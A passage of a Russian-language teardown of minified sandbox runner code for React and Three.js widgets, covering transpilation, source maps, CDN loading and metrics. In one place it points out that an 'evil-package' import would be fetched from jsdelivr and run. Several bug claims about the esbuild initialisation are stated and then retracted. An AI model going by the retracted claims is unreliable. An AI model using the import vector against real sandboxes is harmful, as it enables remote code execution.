# Раннеры: `run-react`, `run-three`, `validate-react` — полный разбор

| Файл | Размер | Роль |
|---|---|---|
| `run-react-vAjeCFay.js` | 15 487 байт | React-виджет: транспиляция → HTML → iframe |
| `run-three-BJvPLrbj.js` | 3 877 байт | Three.js-виджет: шаблон + importmap |
| `validate-react-ByR8Hv0v.js` | 682 байта | проверка кода без показа |

---

# ЧАСТЬ 1. `run-react-vAjeCFay.js`

## 1.1 Что внутри

Файл на 15 КБ, но **60% — это упакованные библиотеки**:

| Кусок | Что | Размер |
|---|---|---|
| `Ne` / `Je()` | `@jridgewell/sourcemap-codec` — кодирование VLQ | ~3.5 КБ |
| `xe` / `Xe()` | `@jridgewell/resolve-uri` — резолв путей | ~2.5 КБ |
| `Re` (main) | `@jridgewell/trace-mapping` — чтение sourcemap | ~6 КБ |
| `Qe` | обёртка `traceMapping` для трансформации позиций | ~0.5 КБ |
| `tn` | **`runReact`** — сама логика | ~2 КБ |

**Реальная логика — `tn` на ~40 строк.** Остальное — инфраструктура sourcemap.

## 1.2 Импорты

```js
import {k as Ae, M as Ce, E as We, d as ze, r as He} from "./main-BR1bOQyH.js";
import {t as Ve} from "./transpile-Cld0n4VL.js";
import {g as Ke} from "./get-html-D9pLuxCy.js";
import {parseAndLogTranspileError as Ze} from "./parse-transpile-error-CaCAx2Mb.js";
```

| Локальное | Откуда | Что |
|---|---|---|
| `Ae` | `k` = `D` | обёртка `Object` для UMD-модулей (`Ne={exports:{}}`) |
| `Ce` | `M` = `bt` | `RunEventType` |
| `We` | `E` = `qn` | `EnvironmentStatus` |
| `ze` | `d` = `X` | `hn({isFirstParty:true, includePrivate:true})` — **приватный API** |
| `He` | `r` = `Dr` | `runHTMLAsync` — создание iframe |
| `Ve` | `t` = `transpileReact` | транспиляция |
| `Ke` | `g` = `getHtml` | сборка HTML |
| `Ze` | `parseAndLogTranspileError` | разбор ошибок |

### Про `Ae` (экспорт `k` = `D`)

```js
var Ne = {exports: {}}, Ie = {exports: {}}, Be;

function Je() {
  return Be || (Be = 1, function (H, D) {
    (function (_, W) { W(D) })(Ae, function (_) { ... })
  }(Ie, Ie.exports)), Ie.exports
}
```

`Ae` — это `D` из main.js, то есть **сам `Object`**. UMD-модули
(как `sourcemap-codec`) получают его как глобал:

```js
(function (_, W) { W(D) })(Ae, function (_) { ... })
//         ↑ Object  ↑ exports
```

Стандартный UMD-паттерн: `(function(global, factory){...})(this, fn)`.
Здесь `this` заменён на `Ae` (модульная ссылка).

## 1.3 `Qe` — трансформатор позиций

```js
const Qe = ({sandboxLogger: H, babelSourceMap: D, esbuildSourceMap: _, lineOffset: W = 0}) => {
  H.time("source_maps.create");
  const J = D && new Re.TraceMap(D),
        q = _ && new Re.TraceMap(_);
  H.timeEnd("source_maps.create");

  return X => {
    let M = X.line - W,          // ← сдвиг на offset
        g = X.column,
        h = null, T = null;

    if (!J && !q) return {line: M, name: h, column: g, source: T};

    try {
      q && ({line: M, column: g, name: h, source: T} =
        Re.originalPositionFor(q, {line: M, column: g}));
      J && M != null && g != null && ({line: M, column: g, name: h, source: T} =
        Re.originalPositionFor(J, {line: M, column: g}));
    } catch (V) {
      H.error("failed to transform position", V);
    }

    return {line: M, column: g, name: h, source: T};
  };
};
```

### Что делает

Получает позицию в **сгенерированном** коде и переводит в позицию
в **исходном**:

```
HTML-строка 16  →  [minus offset 12]  →  строка 4  →  [esbuild map]  →  строка 3  →  [babel map]  →  строка 3 (оригинал)
```

### Разбор

**`new Re.TraceMap(map)`** — `@jridgewell/trace-mapping` парсит sourcemap v3.

**`M = X.line - W`** — сдвиг. `W` = `sourceMapLineOffset` из `getHtml`.
Убирает HTML-шапку.

**Двойная трансформация:**
1. `esbuild` — JSX → JS (sourcemap описывает соответствие)
2. `babel` — TypeScript-парсинг + SWC-стиль AST

**Порядок:** сначала `esbuild`, потом `babel`. То есть:

```
esbuild: HTML-позиция → JS-позиция
babel:   JS-позиция   → TSX-позиция (оригинал)
```

**`J && M != null && g != null`** — второй проход только если:
- `babelSourceMap` есть
- первый проход вернул валидные `line`/`column`

**Если `esbuild` вернул `line: null`** — babel-проход не выполнится,
позиция останется `null`.

**`catch`** — если sourcemap битый, возвращаются **не** трансформированные
координаты (то есть координаты в HTML). Логируется ошибка.

**`H.time("source_maps.create")` / `timeEnd`** — замер создания `TraceMap`.
Он дорогой (парсит строку), но одноразовый.

### Зачем это нужно

Когда в виджете происходит `throw new Error("...")`, стектрейс содержит
строку в **итоговом HTML**. Пользователь хочет видеть строку в **своём**
коде. `Qe` — этот транслятор.

Он передаётся в `runHTMLAsync` как `transformPosition`.

## 1.4 `tn` — `runReact`

```js
async function* tn(H) {
  const {sandboxLogger: D} = H;

  yield {type: Ce.ENVIRONMENT_STATUS, status: We.INITIALIZING};
  D.time("react.transpile");
  yield {type: Ce.ENVIRONMENT_STATUS, status: We.INSTALLING_PACKAGES};

  let _ = null, W = null, J = null, q = [];

  try {
    ({transpiledCode: _, sourceMap: {babel: J, esbuild: W}, css: q} = await Ve(H));
  } catch (T) {
    D.count("html.preview_started");
    D.count("html.preview_startup_error");
    const V = Ze(D, T);
    D.timeEnd("react.transpile");
    V && (yield {type: Ce.ERROR, line: V.line, error: V, errorSource: "transpile"});
    yield {type: Ce.RUN_COMPLETE, duration: null, wasCancelled: !1, wasFatalError: !0};
  }

  if (D.timeEnd("react.transpile"), _ == null) {
    D.count("html.preview_started");
    D.count("html.preview_startup_error");
    yield {type: Ce.RUN_COMPLETE, duration: null, wasCancelled: !1, wasFatalError: !0};
  }

  const {html: X, size: M, sourceMapLineOffset: g} =
    Ke({transpiledCode: _, css: [...H.additionalCss ?? [], ...q]});

  const h = Qe({sandboxLogger: D, babelSourceMap: J, esbuildSourceMap: W, lineOffset: g});

  ze().sendInstrument({type: "hist", label: "transpiled_react_size", value: M});

  yield* He({
    ...H,
    sandboxLogger: D,
    expectReadySignal: !0,
    measureHeight: !0,
    measureWidth: !1,
    html: X,
    theme: H.theme,
    transformPosition: h
  });
}
```

### События — порядок

```
1. ENVIRONMENT_STATUS {INITIALIZING}         (status = 0)
2. ENVIRONMENT_STATUS {INSTALLING_PACKAGES}  (status = 1)
3. [транспиляция]
4. либо ERROR + RUN_COMPLETE {wasFatalError: true}
   либо ENVIRONMENT_STATUS {RUNNING_CODE}    (status = 2, из runHTMLAsync)
5. [рендер в iframe]
6. RUN_COMPLETE {wasFatalError: false}
```

**Обрати внимание:** `INITIALIZING` и `INSTALLING_PACKAGES` идут **до**
транспиляции. То есть UI показывает «Устанавливаем пакеты», хотя ничего
не устанавливается — идёт транспиляция.

**Почему так:** для консистентности с Python-виджетами, где
`INSTALLING_PACKAGES` — реальная установка через `micropip`.

### Ошибка транспиляции

```js
} catch (T) {
  D.count("html.preview_started");
  D.count("html.preview_startup_error");
  const V = Ze(D, T);
  D.timeEnd("react.transpile");
  V && (yield {type: Ce.ERROR, line: V.line, error: V, errorSource: "transpile"});
  yield {type: Ce.RUN_COMPLETE, duration: null, wasCancelled: !1, wasFatalError: !0};
}
```

**Метрики:** две штуки — `preview_started` и `startup_error`. Обе `count`.

**`V && (yield ...)`** — если парсер вернул объект (то есть это был `Error`),
отдаём `ERROR` с полями:
- `line` — номер строки
- `error` — `{name, line, message, stack}`
- `errorSource: "transpile"` — важно! Отличает от `"runtime"`.

**`RUN_COMPLETE {wasFatalError: true}`** — сообщаем хосту, что запуск провалился.

**НО:** после `catch` **нет `return`**! Код продолжается на строку
`if (D.timeEnd(...), _ == null)`. Если `_` (transpiledCode) остался `null` —
отдаётся **второй** `RUN_COMPLETE`.

**Это баг:** при ошибке транспиляции хост получит **два** `RUN_COMPLETE`:
первый из `catch`, второй из проверки `_ == null`.

**Проверим:** `catch` не делает `return`, `_` был инициализирован как `null`.
Значит `_ == null` → `true` → второй `yield RUN_COMPLETE`.

**Последствие:** хост может дважды обработать завершение. Если он идемпотентен —
ничего страшного. Если нет (например, запускает следующий шаг) — сбой.

### Объединение CSS

```js
Ke({transpiledCode: _, css: [...H.additionalCss ?? [], ...q]})
```

**`H.additionalCss`** — CSS, переданный хостом (из `runUserCode`).
**`q`** — CSS из транспиляции (shadcn-стили + Tailwind).

**Порядок:** сначала `additionalCss`, потом транспилированный. То есть
пользовательский CSS **раньше** — его правила могут быть переопределены
стилями компонентов.

**`...H.additionalCss ?? []`** — приоритет операторов!

```js
...H.additionalCss ?? []
```

Это парсится как `...(H.additionalCss ?? [])` — потому что spread требует
выражение после себя, и `??` в него входит.

**Если `additionalCss` = `undefined`** → `[]`. Ок.

### Метрика размера

```js
ze().sendInstrument({type: "hist", label: "transpiled_react_size", value: M});
```

`M` = `size` из `getHtml` — длина транспилированного кода в символах.
Метрика `hist` (гистограмма).

**`ze()`** = `X()` = `hn({isFirstParty: true, includePrivate: true})` —
**приватный API**. То есть `sendInstrument` доступен только first-party.
В `runReact`, который вызывается из `runUserCode` с `isFirstParty: false`,
эта строка всё равно выполнится, потому что `X()` вызывается напрямую,
а не через `additionalGlobals`.

### Передача в `runHTMLAsync`

```js
yield* He({
  ...H,                        // все остальные параметры из runUserCode
  sandboxLogger: D,
  expectReadySignal: !0,       // ждать data-ready
  measureHeight: !0,           // замерять высоту
  measureWidth: !1,            // ширину не мерить
  html: X,                     // готовый HTML
  theme: H.theme,              // явно
  transformPosition: h         // sourcemap-трансформер
});
```

**`...H`** — пробрасывает `id`, `additionalGlobals`, `enableExternalNavigationGating`,
`allowPopups`, `worker` (лишнее, но безвредное), `csp` (тоже лишнее).

**`expectReadySignal: true`** — ждём `data-ready` на `<html>`. Это ставит
`jGe()` в транспайлере:

```js
requestAnimationFrame(() => {
  requestAnimationFrame(() => {
    document.documentElement.setAttribute('data-ready', '');
  })
})
```

**Двойной `requestAnimationFrame`** — ждём двух кадров, чтобы React успел
отрисовать. Первый rAF — после текущего кадра, второй — ещё через кадр.
Гарантия, что рендер завершён.

**`measureHeight: true, measureWidth: false`** — виджет измеряет высоту
(для авто-размера), ширину берёт от контейнера.

## 1.5 Схема целиком

```
runReact(logger, params)
 │
 ├─ yield ENVIRONMENT_STATUS INITIALIZING
 ├─ yield ENVIRONMENT_STATUS INSTALLING_PACKAGES
 │
 ├─ transpileReact({
 │     code, id, sandboxLogger, worker: true, minify: false
 │   })
 │   ├─ initEsbuild() — esbuild-wasm 0.24.2 с cdn.jsdelivr.net / unpkg.com
 │   ├─ babel.transform() — парсинг TS/JSX в AST
 │   ├─ generateShadcnImportBlock() — какие компоненты нужны
 │   ├─ tailwind генерация CSS
 │   ├─ esbuild.context({bundle, format: esm, jsx: automatic})
 │   └─ rebuild() → {transpiledCode, sourceMap: {babel, esbuild}, css}
 │
 ├─ getHtml({transpiledCode, css: [...additionalCss, ...css]})
 │
 ├─ Qe({babelSourceMap, esbuildSourceMap, lineOffset})
 │
 ├─ sendInstrument({type: "hist", label: "transpiled_react_size"})
 │
 └─ yield* runHTMLAsync({
      ...params, html, expectReadySignal: true,
      measureHeight: true, measureWidth: false, transformPosition
    })
      ├─ создать iframe (sandbox)
      ├─ document.open()
      ├─ Xt() — инъекция глоболов
      ├─ document.write(html)
      ├─ MutationObserver → data-ready
      └─ yield ENVIRONMENT_STATUS RUNNING_CODE
```

---

# ЧАСТЬ 2. `transpileReact` — что реально происходит

Хотя это другой файл, без него `run-react` не понять.

## 2.1 Полный код

```js
yJe = async ({id: x, code: D, sandboxLogger: g, worker: f, minify: v = !1,
              disableShadcnImports: S = !1}) => {
  // 1. инициализация esbuild-wasm
  const A = await hWe({worker: f});

  // 2. Babel/SWC-парсинг
  g.time("babel.transform");
  let M, P = null;
  ({code: D, ast: M, map: P} = await AGe(D));
  g.timeEnd("babel.transform");

  // 3. shadcn-импорты
  let $ = "", H = [], W = new Set;
  S || (g.time("generateShadcnImportBlock"),
        {imports: $, components: H, classNames: W} = await wGe(M),
        g.timeEnd("generateShadcnImportBlock"));

  // 4. склеить импорты + код
  D = `${$}\n\n${D}`;

  // 5. обёртка index.js (createRoot + data-ready)
  const U = jGe(H);

  // 6. Tailwind CSS
  const I = fJe({language: "jsx", code: D, additionalClassNames: W, sandboxLogger: g});

  // 7. esbuild bundle
  g.time("esbuild.transpile");
  if (!La || !La.id || La.id !== x) {
    La = {
      id: x, css: [], indexFile: U, sourceCode: D,
      buildContext: await A.context({
        entryPoints: ["index.js"],
        bundle: !0, write: !1,
        plugins: [mJe(), gJe()],
        format: "esm",
        minify: v,
        treeShaking: !0,
        splitting: !1,
        jsx: "automatic",
        jsxImportSource: "react",
        sourcemap: "external",
        outfile: "bundle.js",
        external: ["react", "react-dom", "lucide-react", "@/components/*"]
      })
    }
  } else {
    La.indexFile = U;
    La.sourceCode = D;
    La.css = [];
  }

  const {outputFiles: ee} = await La.buildContext.rebuild();
  g.timeEnd("esbuild.transpile");

  if (!ee) throw new Error("Failed to transpile React code");

  const Ce = ee.find(ze => ze.path.endsWith(".js")),
        Se = ee.find(ze => ze.path.endsWith(".js.map"));
  if (!Ce) throw new Error("Expected JS file");
  if (!Se) throw new Error("Expected source map file");

  const dr = Ce.text;
  let Ve = null;
  try { Ve = JSON.parse(Se.text) } catch {}

  return {
    transpiledCode: dr,
    sourceMap: {babel: P, esbuild: Ve},
    css: [...La?.css ?? [], await I]
  };
};
```

## 2.2 `hWe` — инициализация esbuild-wasm

```js
hWe = async ({worker: x = !1} = {}) => {
  if (QD) return await QD;                     // кэш
  const D = [
    `https://cdn.jsdelivr.net/npm/esbuild-wasm@${fZ}/esbuild.wasm`,
    `https://unpkg.com/esbuild-wasm@${fZ}/esbuild.wasm`
  ];
  for (let g = 0; g < D.length; g++) {
    const f = D[g];
    try {
      return QD = new Promise(v => {
        pZ.initialize({wasmURL: f, worker: x}).then(() => { v(pZ) })
      }), await QD;
    } catch (v) {
      if (g === D.length - 1) throw v;         // последний — пробросить
    }
  }
  throw new Error("Failed to initialize esbuild");
};
```

**`fZ = "0.24.2"`** — версия esbuild-wasm.

**Два CDN:** jsdelivr → unpkg (fallback).

**`QD`** — глобальный кэш промиса.

**БАГ:** `try` вокруг `new Promise(...)` не поймает ошибку инициализации,
потому что промис не `await`-ится внутри `try` до `.then()`. Точнее:

```js
return QD = new Promise(v => { ... }), await QD;
```

Здесь `QD` присваивается, потом `await QD`. Если `initialize()` **отклонит**
промис — нет `.catch()`, значит промис **никогда не резолвится** (внутри
только `then`, без `catch`). `await QD` зависнет навсегда.

**То есть при недоступности jsdelivr:`await QD` — вечное зависание.** Второй
CDN (unpkg) никогда не попробуется.

**Реально ли это:** в `hWe` нет обработки `reject`. Если `initialize` бросит
`reject`, промис в `QD` — rejected, `await QD` бросит. Тогда `catch (v)`
сработает, пойдёт следующий CDN. **Значит fallback работает.**

Но `QD` останется rejected-промисом. При **повторном** вызове
`if (QD) return await QD` → сразу бросит. То есть после одной неудачи
кэш отравлен.

**Это баг:** если jsdelivr недоступен, а unpkg — доступен, первый вызов
сработает (через unpkg), но `QD` останется промисом от jsdelivr (rejected).
Второй вызов упадёт сразу.

Хотя — `QD = new Promise(...)` перезаписывается на каждой итерации. При
втором проходе `QD` — промис от unpkg. Значит всё ок.

**Уточним:** на первой итерации `QD` = промис jsdelivr → reject →
`catch` → вторая итерация → `QD` = промис unpkg → resolve. `QD` хранит
**последний** промис. Всё правильно.

## 2.3 `AGe` — Babel/SWC парсинг

```js
AGe = async x => {
  const {types: D} = wB.packages,
        {code: g, ast: f = null, map: v} = wB.transform(x, {
          filename: "index.tsx",
          ast: !0,
          sourceMaps: !0,
          parserOpts: {plugins: ["jsx", "typescript"]},
          plugins: [
            hGe(D), bGe(D),
            FGe([/^(?:\/|@)?components(?:\/.*)?$/, /^(?:\/|@)?shadcn(?:\/.*)?$/, /^(?:\/|@)?ui(?:\/.*)?$/])
          ]
        });
  if (!f) throw new Error("Failed to parse code");
  return {code: g ?? x, ast: f, map: v};
};
```

**`wB`** — `@babel/standalone` (вшит в `transpile-Cld0n4VL.js`, 3.5 МБ).

**Плагины парсера:** `jsx`, `typescript`.

**`filename: "index.tsx"`** — всегда `.tsx`, чтобы TS-синтаксис работал.

**Результат:** `{code, ast, map}`.

**Если `ast` пустой** → `throw "Failed to parse code"`. Это и есть
большинство ошибок синтаксиса (те, что ловит Babel, а не esbuild).

## 2.4 `wGe` — генерация shadcn-импортов

```js
RGe = async x => {
  const {packages: D} = await vee(async () => {
    const {packages: S} = await Promise.resolve().then(() => CGe);
    return {packages: S}
  }, void 0);
  const {types: g, traverse: {default: f}} = D, v = [];

  x && f(x, {
    JSXOpeningElement(S) {
      const A = S.node.name;
      function M($) {
        return g.isJSXIdentifier($) ? $.name
             : g.isJSXMemberExpression($) ? `${M($.object)}.${M($.property.name)}`
             : g.isJSXNamespacedName($) ? `${$.namespace.name}:${$.name.name}`
             : ""
      }
      const P = M(A);
      P.toLowerCase() !== P && v.push(P);
    }
  });

  return v;
};
```

**Что делает:** обходит AST, находит все JSX-элементы, у которых имя
**не** в нижнем регистре (то есть компоненты, а не `<div>`, `<span>`).

**`P.toLowerCase() !== P`** — фильтр. `<div>` → `"div" === "div"` → не компонент.
`<Button>` → `"button" !== "Button"` → компонент.

**Результат:** `["Button", "Card", "CardHeader", "CardTitle", ...]`.

Дальше `wGe` (не показан целиком) сопоставляет имена с таблицей `BGe`:

```js
BGe = [{
  importPath: "@/components/ui/accordion",
  importStatement: 'import { Accordion, AccordionItem, ... } from "@/components/ui/accordion";',
  exports: ["Accordion", "AccordionItem", "AccordionTrigger", "AccordionContent"],
  classNames: ["border-b", "flex", ...]
}, ...]
```

**`classNames`** — важное! Список Tailwind-классов, которые используются
в компоненте. Они передаются в Tailwind-генератор, чтобы он включил
нужные утилиты в CSS.

## 2.5 `jGe` — обёртка `index.js`

```js
jGe = x => `
${x?.includes("Tooltip") ? SGe : TGe}

try {
  const root = createRoot(document.getElementById("root"));
  root.render(createElement(UserComponentWithErrorBoundary));

  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      document.documentElement.setAttribute('data-ready', '');
    })
  })
} catch (error) {
  console.error(error)
  document.documentElement.setAttribute('data-fatal', '');
}
`.trim()
```

**Две ветки:**
- `TGe` — без Tooltip
- `SGe` — с Tooltip (нужен `<TooltipProvider>` обёртка)

**Выбор по `x.includes("Tooltip")`** — если среди компонентов есть Tooltip,
используется версия с провайдером.

**`data-ready`** — ставится через **двойной** `requestAnimationFrame`.
Это сигнал `runHTMLAsync` (`expectReadySignal: true`), что рендер завершён.

**`data-fatal`** — при ошибке. `runHTMLAsync` ловит через MutationObserver
и завершает запуск.

## 2.6 `fJe` — Tailwind генерация

```js
fJe = async ({sandboxLogger: x, code: D, language: g = "jsx", additionalClassNames: f = []}) => {
  const v = UB(f),
        S = cJe(D, g, v),              // ключ кэша
        A = Fee.get(S);                // кэш
  return A || pJe.runExclusive(async () => {
    x.time("tailwind");
    try {
      const M = await Ree({content: D, extension: g, returnPositions: !1});
      //    ↑ tailwindcss-oxide (WASM)
      const P = UB(M.filter(H => typeof H === "string").concat(v));
      const $ = await oJe({css: lJe, candidates: P});
      return Fee.set(S, $), $;
    } catch (M) {
      throw x.error("Tailwind generation failed", M), M;
    } finally { x.timeEnd("tailwind") }
  });
};
```

**`Ree`** — Tailwind CSS oxide (Rust, скомпилирован в WASM —
`tailwindcss_oxide_bg-DaSLdPNK.wasm`, 1.7 МБ).

**Что делает:** сканирует код, находит Tailwind-классы (`flex`, `p-4`,
`text-sm`), генерирует **только** CSS для найденных классов.

**`pJe.runExclusive`** — мьютекс! Tailwind-wasm не потокобезопасен,
поэтому запуски сериализуются.

**`Fee`** — Map-кэш по хешу кода.

**`cJe`** — ключ:
```js
cJe = (x, D, g) => {
  const f = UB(g);
  return `${D}:${f.join(".")}::${x}`
};
```
`"jsx:flex.p-4.text-sm::<код>"`.

## 2.7 `mJe` / `gJe` — esbuild-плагины

### `mJe` — resolve

```js
mJe = () => ({
  name: "onResolve-plugin",
  setup(x) {
    x.onResolve({filter: /^index\.js$/}, ({path: D}) => ({path: D, namespace: "internal"}));
    x.onResolve({filter: /^\.\/user-component\.js$/}, () => ({path: Bm, namespace: "internal"}));
    x.onResolve({filter: /^\.+\//}, ({path: D, importer: g}) => {
      let f = "";
      try { f = new URL(D, g).toString() } catch {
        if (!DJe.test(g)) throw new Error(`File not found: ${D}`)
      }
      return {path: f, namespace: "external"}
    });
    x.onResolve({filter: /^@\/.*/}, ({path: D}) =>
      D in AB ? {path: D, namespace: "internal"} : null);
    x.onResolve({filter: /^[^./]/}, ({path: D}) => {
      const g = Aee(D);
      return {path: RB(`${Eee}/npm/${g}/+esm`), namespace: "external"}
    });
    x.onResolve({filter: /^\//}, ({path: D}) => ({path: RB(`${Eee}${D}`), namespace: "external"}));
  }
});
```

**Что перехватывает:**

| Regex | Что | Куда |
|---|---|---|
| `/^index\.js$/` | точка входа | `internal` |
| `/^\.\/user-component\.js$/` | код пользователя | `internal` (`Bm`) |
| `/^\.+\//` | относительные | `new URL()` → `external` |
| `/^@\/.*/` | shadcn-импорты | `internal` если в `AB` |
| `/^[^./]/` | пакеты (`react`, `lucide-react`) | `https://cdn.jsdelivr.net/npm/<pkg>/+esm` |
| `/^\//` | абсолютные пути | `https://cdn.jsdelivr.net<path>` |

**`AB`** — карта shadcn-компонентов:
```js
AB = {...gGe, ...DGe, ...mGe, "@/components/ui/sonner": nGe, "@/components/ui/toast": dGe}
```

**`Eee = "https://cdn.jsdelivr.net"`** — база для пакетов.

**`Aee(D)`** — нормализация имени пакета:
```js
function Aee(x) {
  return x.replace(/(lucide-react\/dist\/esm\/icons\/[^/"'?]+)\.js(?:...)?/, ...)
}
```
Спец-обработка для `lucide-react` (иконки без расширения `.js`).

**КРИТИЧНО:** `/^[^./]/` → `https://cdn.jsdelivr.net/npm/<pkg>/+esm`.

**То есть любой импорт пакета уходит в интернет.** Если пользователь напишет:

```js
import evil from "evil-package";
```

esbuild загрузит `https://cdn.jsdelivr.net/npm/evil-package/+esm` — и **выполнит**
код оттуда. CSP разрешает `cdn.jsdelivr.net` в `script-src`.

**Это вектор:** любой npm-пакет, доступный на jsdelivr, будет исполнен.
Через `+esm` jsdelivr конвертирует CommonJS в ESM.

### `gJe` — load

```js
gJe = () => ({
  name: "onLoad-plugin",
  setup(x) {
    x.onLoad({filter: /^index\.js$/, namespace: "internal"},
      () => ({contents: La?.indexFile ?? "", loader: "tsx"}));
    x.onLoad({filter: new RegExp(`^${Bm}$`), namespace: "internal"},
      () => ({contents: La?.sourceCode ?? "", loader: "tsx"}));
    x.onLoad({filter: /^@\/.*/, namespace: "internal"},
      async ({path: D}) => D in AB ? {contents: AB[D], loader: "tsx"} : null);
    x.onLoad({filter: /.*/, namespace: "external"}, async ({path: D}) => {
      if (um[D]) return um[D];                     // кэш

      const g = await fetch(D);                    // ← ЗАГРУЗКА ИЗ СЕТИ
      if (!g.ok) throw new Error(`Failed to fetch ${D}`);

      const f = g.headers.get("Content-Type");
      let v = "jsx";
      if (f?.includes("application/typescript") || D.endsWith(".ts")) v = "ts";
      else if (D.endsWith(".tsx")) v = "tsx";
      else if (D.endsWith(".js")) v = "jsx";
      else if (D.endsWith(".css") || f?.includes("text/css")) {
        const P = await g.text();
        La?.css.push(P);                            // CSS отдельно
        const $ = {contents: "", loader: "js"};
        return um[D] = $, $;
      }

      const S = await g.text(),
            M = {contents: RB(S), loader: v};
      return um[D] = M, M;
    });
  }
});
```

**`fetch(D)`** — реальная загрузка. В Worker'е или главном потоке.

**`um[D]`** — кэш по URL.

**CSS отдельно:** `.css` не отдаётся esbuild, а **пушится в `La.css`**
(список для `getHtml`). Взамен отдаётся пустой JS-модуль.

**`RB(S)`** — экранирование:
```js
RB = S => S.replaceAll("</script", "<\\/script")
```
То есть при загрузке кода из сети `</script>` экранируется.

---

# ЧАСТЬ 3. `run-three-BJvPLrbj.js`

## 3.1 Полный код

```js
import {M as f, E as _, r as S} from "./main-BR1bOQyH.js";

const N = "visualization.first_render_time_ms",
      O = "visualization.load.failure",
      k = "visualization.payload_size_kb",
      E = "visualization.render.outcome",
      w = "visualization.render.tbt_ms",
      y = "visualization.render.tbt_unavailable",
      M = "visualization.view_count",
      U = "threejs",
      v = "code_snippet",
      L = 50;
```

Метрики для аналитики визуализаций.

## 3.2 `s()` — теги

```js
function s({errorSource: e, errorType: n, outcome: r, reason: o} = {}) {
  const t = [{key: "renderer", value: U}, {key: "source_format", value: v}];
  e != null && t.push({key: "error_source", value: e});
  n != null && t.push({key: "error_type", value: n});
  r != null && t.push({key: "outcome", value: r});
  o != null && t.push({key: "reason", value: o});
  return t;
}
```

Теги: `renderer=threejs`, `source_format=code_snippet`, плюс опциональные.

## 3.3 `z()` — трекер метрик

```js
function z({code: e, sandboxLogger: n}) {
  let r = !1, o = !1, t = null, a = 0;
  const i = h();                                    // start time

  const l = () => { o || (o = !0, n.hist(k, C(e), s())) };   // payload size

  const T = u => {
    t?.disconnect();
    t != null && n.hist(w, a, s({outcome: u}));     // TBT
  };

  return {
    cancel: () => { r || (r = !0, t?.disconnect()) },

    fail: ({errorSource: u = "runtime", errorType: I = "unknown"} = {}) => {
      r || (r = !0, l(), n.count(O, 1, s({errorSource: u, errorType: I})),
            n.count(E, 1, s({outcome: "failure"})), T("failure"))
    },

    startRenderSpan: u => {
      const c = u.PerformanceObserver,
            m = c?.supportedEntryTypes;
      if (!(m?.includes("longtask") === !0) || c == null)
        return n.count(y, 1, s({reason: "unsupported"})), () => t?.disconnect();

      try {
        const p = new c(A => {
          for (const d of A.getEntries())
            d.entryType === "longtask" && (a += Math.max(0, d.duration - L))
        });
        p.observe({entryTypes: ["longtask"]});
        t = p;
      } catch (p) {
        n.count(y, 1, s({reason: V(p)}))
      }
      return () => t?.disconnect()
    },

    succeed: () => {
      r || (r = !0, l(), n.hist(N, h() - i, s()), n.hist(M, 1, s()),
            n.count(E, 1, s({outcome: "success"})), T("success"))
    }
  };
}
```

### Что измеряется

**`renderer=threejs`, `source_format=code_snippet`** — фиксированные теги.

**Метрики:**
- `visualization.first_render_time_ms` — от старта до `RUNNING_CODE`
- `visualization.payload_size_kb` — размер кода в КБ
- `visualization.render.outcome` — `success`/`failure`
- `visualization.render.tbt_ms` — **Total Blocking Time**
- `visualization.render.tbt_unavailable` — если `PerformanceObserver` нет
- `visualization.view_count` — всегда 1
- `visualization.load.failure` — при ошибке

### TBT — Total Blocking Time

```js
d.entryType === "longtask" && (a += Math.max(0, d.duration - L))
```

**`L = 50`** — порог. Задача, занявшая больше 50 мс, считается «блокирующей».
Её вклад = `duration - 50`.

**Суммируется** по всем longtask-записям.

**`Math.max(0, ...)`** — защита: хотя `longtask` обычно > 50 мс, иногда
браузер отдаёт чуть меньше. Не даём отрицательного вклада.

**`startRenderSpan(viewWindow)`** — запускает observer в **окне iframe**
(`u.PerformanceObserver`), не в главном.

**Если `longtask` не поддерживается** (Safari, Firefox) → метрика
`tbt_unavailable` с `reason`. Fallback нет.

### `h()` — время

```js
function h() { return typeof performance < "u" ? performance.now() : Date.now() }
```
`performance.now()` если есть (всегда есть в браузере).

## 3.4 `g()` — извлечь скрипт из HTML

```js
function g(e) {
  const n = e.match(/<script\b[^>]*type=["']module["'][^>]*>([\s\S]*?)<\/script>/i);
  if (n?.[1] != null) return n[1].trim();

  const r = e.match(/<script\b[^>]*>([\s\S]*?)<\/script>/i);
  return r?.[1] != null ? r[1].trim() : e.trim();
}
```

**Три уровня:**
1. `<script type="module">...</script>` — содержимое
2. `<script>...</script>` — содержимое (если нет module)
3. весь код как есть

**`[\s\S]*?`** — нежадный, любой символ включая переводы строк.

**`i`** — без учёта регистра.

**Зачем:** пользователь может дать полный HTML или чистый JS. Скрипт
извлекается, чтобы вставить в свой шаблон.

## 3.5 `Z()` — экранирование

```js
function Z(e) { return e.replaceAll("</script", "<\\/script") }
```

Заменяет **все** вхождения `</script` на `<\/script`. Нужно, чтобы код
не закрыл тег раньше времени.

**`replaceAll`** — все вхождения, не только первое.

## 3.6 `F()` — шаблон HTML

```js
function F(e) {
  const n = Z(g(e));
  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Three.js visualization</title>
    <style>
      html, body {
        width: 100%; height: 100%; margin: 0;
        overflow: hidden; background: #02030a;
      }
      canvas { display: block; }
    </style>
    <script type="importmap">
      {
        "imports": {
          "three": "https://unpkg.com/three@${R}/build/three.module.js",
          "three/addons/": "https://unpkg.com/three@${R}/examples/jsm/"
        }
      }
    <\/script>
  </head>
  <body>
    <script type="module">
${n}

requestAnimationFrame(() => {
  document.documentElement.setAttribute("data-ready", "");
});
    <\/script>
  </body>
</html>`
}
```

**`R = "0.179.1"`** — версия three.js.

**`importmap`:**
```json
{
  "imports": {
    "three": "https://unpkg.com/three@0.179.1/build/three.module.js",
    "three/addons/": "https://unpkg.com/three@0.179.1/examples/jsm/"
  }
}
```

**Что это даёт:** пользователь пишет
```js
import * as THREE from "three";
import { OrbitControls } from "three/addons/controls/OrbitControls.js";
```
и эти импорты резолвятся в unpkg. **Без бандлера.**

**`data-ready`** — через **один** `requestAnimationFrame` (в отличие
от React, где двойной). Three.js рендерит синхронно в первом кадре.

**`background: #02030a`** — почти чёрный синеватый.

**`overflow: hidden`** — канвас на весь экран, без скролла.

**`<meta name="viewport">`** — есть! (в отличие от `getHtml` для React,
где его нет).

## 3.7 `B()` — `runThree`

```js
async function* B({code: e, sandboxLogger: n, enableExternalNavigationGating: r, allowPopups: o}) {
  const t = z({code: e, sandboxLogger: n});
  let a = null;

  yield {type: f.ENVIRONMENT_STATUS, status: _.INITIALIZING};

  try {
    for await (const i of S({
      html: F(e),
      sandboxLogger: n,
